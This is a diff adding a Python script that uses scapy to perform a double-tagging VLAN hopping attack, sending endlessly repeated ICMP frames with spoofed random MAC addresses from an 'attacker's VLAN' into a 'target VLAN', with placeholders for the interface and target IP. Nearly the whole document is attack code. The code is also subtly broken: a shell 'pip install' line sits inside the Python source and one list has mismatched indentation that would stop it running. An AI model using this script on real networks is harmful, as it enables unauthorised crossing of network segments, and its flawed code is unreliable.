@@ -1,0 +1,37 @@
+pip install scapy
+from scapy.all import *
+import random
+import time
+
+def generate_random_mac():
+    """Generates a random MAC address."""
+          mac = [0x00, 0x16, 0x3e,
+           random.randint(0x00, 0x7f),
+           random.randint(0x00, 0xff),
+           random.randint(0x00, 0xff)]
+    return ':'.join(map(lambda x: "%02x" % x, mac))
+
+def send_vlan_hopping_packets(interface, target_ip, primary_vlan, secondary_vlan):
+    """Send packets with double VLAN tags to perform VLAN hopping."""
+    while True:
+        src_mac = generate_random_mac()
+
+        # Create a packet with double VLAN tagging
+        packet = Ether(src=src_mac) / \
+                 Dot1Q(vlan=primary_vlan) / \
+                 Dot1Q(vlan=secondary_vlan) / \
+                 IP(dst=target_ip) / \
+                 ICMP()
+
+        sendp(packet, iface=interface)
+        print(f"Sent packet with MAC {src_mac} to {target_ip} with VLANs {primary_vlan} -> {secondary_vlan}")
+
+        time.sleep(random.randint(1, 5))  # Send packets at random intervals
+
+if __name__ == "__main__":
+    interface = "eth0"  # Replace with your network interface
+    target_ip = "192.168.1.100"  # Replace with the target IP
+    primary_vlan = 10  # The attacker's VLAN
+    secondary_vlan = 20  # The target VLAN to hop into
+
+    send_vlan_hopping_packets(interface, target_ip, primary_vlan, secondary_vlan)
